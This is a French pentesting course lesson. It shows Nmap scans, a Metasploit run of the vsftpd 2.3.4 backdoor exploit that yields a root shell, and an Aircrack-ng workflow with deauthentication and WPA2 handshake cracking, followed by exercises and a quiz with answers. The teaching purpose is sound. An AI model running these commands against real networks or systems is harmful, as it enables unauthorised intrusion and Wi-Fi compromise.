# TOME P2 — Réseaux & Télécoms — Jour 85 (6h) : Sécurité Offensive & Pentesting Réseau (Metasploit, Nmap & Wi-Fi Hacking)

> [!NOTE]
> **Objectif du jour :** Comprendre les méthodologies d'évaluation des vulnérabilités et de tests d'intrusion (Pentesting) d'un point de vue éthique et défensif (Red Teaming / Blue Teaming) : reconnaissance avec Nmap, exploitation de failles connues avec Metasploit Framework, et audit de sécurité des réseaux sans-fil (Aircrack-ng suite).
>
> **Compétences visées :** `SEC-04` (A) — Évaluation de la Sécurité Réseau | `SEC-06` (A) — Tests d'Intrusion & Red Teaming Éthique

---

## 1) Module — Reconnaissance & Balayage de Réseau Avancé avec Nmap (2h)

### 📖 Narration/Intuition

Dans une posture de sécurité défensive (Blue Team) ou d'audit de sécurité éthique (Red Team), la **reconnaissance** est la phase la plus critique. Avant de pouvoir défendre ou tester une infrastructure comme celle de la BCC, il faut cartographier exactement tous les équipements connectés, les ports ouverts, les services actifs et les versions de logiciels exécutées.

**Nmap (Network Mapper)** est l'outil standard mondial de cartographie réseau et de détection de services.

### 开启 Anatomie Technique

**Techniques de balayage Nmap et cas d'usage :**

```bash
# ─── 1. Scan Stealth SYN (TCP Half-Open Scan - -sS) ───────────────────────────
# Ne finalise pas le 3-way handshake TCP (envoie SYN, reçoit SYN-ACK, envoie RST)
# Rapide et discret (évite de remplir les logs applicatifs simples)
sudo nmap -sS -p 1-65535 -T4 10.0.10.0/24

# ─── 2. Scan de Détection de Version et Système d'Exploitation (-sV -O) ───────
# Interroge les bannières de service et analyse les réponses TCP/IP fingerprint
sudo nmap -sV --version-intensity 5 -O 10.0.10.50

# ─── 3. Utilisation des Scripts NSE (Nmap Scripting Engine) ───────────────────
# Recherche de vulnérabilités connues (CVE) sur les services détectés
sudo nmap -sV --script vuln 10.0.10.50

# Scan spécifique de vulnérabilité SSL/TLS
sudo nmap -p 443 --script ssl-enum-ciphers,ssl-cert 10.0.10.50

# Scan SMB / Active Directory (détection de partage et vulnérabilités type EternalBlue)
sudo nmap -p 445 --script smb-vuln-ms17-010,smb-enum-shares 10.0.10.100
```

---

## 2) Module — Exploitation Éthique avec Metasploit Framework (2h)

### 📖 Narration/Intuition

**Metasploit Framework (MSF)** est une plateforme de développement et d'exécution d'exploits. Pour les auditeurs de sécurité, Metasploit permet de valider de manière empirique si une vulnérabilité théorique détectée par Nmap ou un scanner de vulnérabilités est réellement exploitable et quel est son impact réel sur le système d'information.

### 🔍 Anatomie Technique

**Structure et utilisation de Metasploit CLI (`msfconsole`) :**

```bash
# Lancer la console Metasploit
msfconsole -q

# Structure des modules Metasploit :
# - exploits/     : Code exploitant une vulnérabilité pour exécuter un payload
# - payloads/     : Code exécuté sur la cible après exploitation (ex: Reverse Shell)
# - auxiliary/    : Scanners, fuzzers, modules d'information (sans payload)
# - post/         : Modules d'inspection/escalade post-exploitation
```

**Exemple d'audit d'un service non mis à jour dans un lab isolé :**

```text
msf6 > search type:exploit name:vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.0.20.50
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > check
[*] 10.0.20.50:21 - The target appears to be vulnerable.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] Command shell session 1 opened (10.0.10.100:4444 -> 10.0.20.50:6200)

id
uid=0(root) gid=0(root) groups=0(root)
```

> [!IMPORTANT]
> **Rappel Éthique & Légal :** L'utilisation de Metasploit ou Nmap contre des systèmes d'information sans autorisation préalable écrite et explicite du propriétaire est un délit pénal grave (infraction d'accès frauduleux à un système de traitement automatisé de données).

---

## 3) Module — Audit de Sécurité des Réseaux Sans-Fil (Aircrack-ng) (2h)

### 📖 Narration/Intuition

Les ondes radio d'un réseau Wi-Fi ne s'arrêtent pas aux murs d'un bâtiment de la BCC. Un attaquant situé sur le parking ou dans la rue peut intercepter les trames réseau sans fil. L'audit Wi-Fi consiste à tester la résistance des mécanismes de chiffrement (WPA2/WPA3) et à vérifier l'étanchéité des configurations d'entreprise.

### 🔍 Anatomie Technique

**Workflow d'audit Wi-Fi avec la suite Aircrack-ng :**

```bash
# 1. Passer la carte Wi-Fi en mode Monitor (Promiscuous Wi-Fi)
sudo airmon-ng start wlan0
# La carte devient wlan0mon

# 2. Capturer le trafic Wi-Fi ambiant pour repérer les BSSID (APs) et canaux
sudo airodump-ng wlan0mon

# 3. Cibler un AP spécifique et capturer le Handshake WPA2 (4-Way Handshake)
sudo airodump-ng --bssid 00:11:22:33:44:55 -c 6 -w /tmp/bcc-wifi-capture wlan0mon

# 4. (Optionnel) Envoyer des trames de déduplication (Deauth) pour forcer un client à se reconnecter
sudo aireplay-ng --deauth 5 -a 00:11:22:33:44:55 wlan0mon

# 5. Tester la robustesse du mot de passe WPA2 (Crack hors ligne)
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 /tmp/bcc-wifi-capture-01.cap
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **NSE** | Nmap Scripting Engine — Moteur de scripts d'extension Nmap (Lua) |
| **MSF** | Metasploit Framework — Plateforme d'exploitation et de pentesting |
| **BSSID** | Basic Service Set Identifier — Adresse MAC physique du point d'accès Wi-Fi |
| **RHOSTS** | Remote Hosts — Adresse(s) IP cible(s) dans Metasploit |
| **LHOST** | Local Host — Adresse IP de l'attaquant/auditeur pour recevoir le reverse shell |
| **CVE** | Common Vulnerabilities and Exposures — Dictionnaire standard des vulnérabilités connues |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** Quelle est la différence entre un scan Nmap SYN (`-sS`) et un scan TCP Connect (`-sT`) ?

**Corrigé :** Le scan Nmap SYN (`-sS`) est un scan "Half-Open" : Nmap envoie un paquet TCP SYN, et si le serveur répond SYN-ACK (port ouvert), Nmap envoie immédiatement un paquet RST pour fermer la connexion sans compléter le 3-way handshake. Le scan TCP Connect (`-sT`) utilise l'appel système `connect()` du système d'exploitation et établit une connexion TCP complète (SYN, SYN-ACK, ACK), ce qui laisse une trace explicite dans les journaux applicatifs du serveur.

**Exercice 2 :** Pourquoi la déconnexion forcée (Deauthentication Attack) permet-elle d'obtenir le Handshake 4-Way d'un réseau WPA2 ?

**Corrigé :** Le Handshake 4-Way WPA2 n'est échangé qu'au moment précis où un client Wi-Fi s'authentifie et se connecte au point d'accès (AP). En envoyant des trames de déauthentification (non chiffrées en WPA2 sans 802.11w PMF), l'auditeur déconnecte temporairement le client. Lorsque le client se reconnecte automatiquement, l'auditeur capture les 4 trames du Handshake requises pour effectuer une attaque par dictionnaire hors-ligne.

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quel paramètre Nmap permet d'exécuter la détection de version des services ainsi que les scripts de détection de vulnérabilités de base ?
- A) -sP
- B) -sV --script vuln
- C) -F
- D) -sn

**Réponse : B**

**Q2 :** Dans Metasploit, quel type de module est utilisé pour écouter et recevoir un accès terminal à distance (shell) depuis une machine cible exploitée ?
- A) Encoder
- B) Nop
- C) Payload (ex: reverse_tcp)
- D) Auxiliary

**Réponse : C**

**Q3 :** Quelle commande de la suite Aircrack-ng permet de passer une interface réseau sans-fil en mode Monitor ?
- A) airmon-ng start <interface>
- B) airodump-ng --crack
- C) aireplay-ng --monitor
- D) iwconfig --connect

**Réponse : A**

**Q4 :** Quelle protection Wi-Fi moderne rend les attaques de déauthentification inefficaces en chiffrant les trames de gestion réseau ?
- A) WEP
- B) WPA2-PSK sans option
- C) 802.11w (PMF - Protected Management Frames) / WPA3
- D) Masquage du SSID

**Réponse : C**

**Q5 :** Dans le cadre d'un audit de sécurité informatique éthique, quel document légal est ABSOLUMENT OBLIGATOIRE avant toute tentative de scan ou d'exploitation ?
- A) Une capture d'écran du terminal
- B) Une autorisation d'intervenir écrite et signée par le responsable légal du système d'information (Autorisation de Pentest / Mandat)
- C) Un diplôme universitaire en informatique
- D) Un compte sur GitHub

**Réponse : B**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
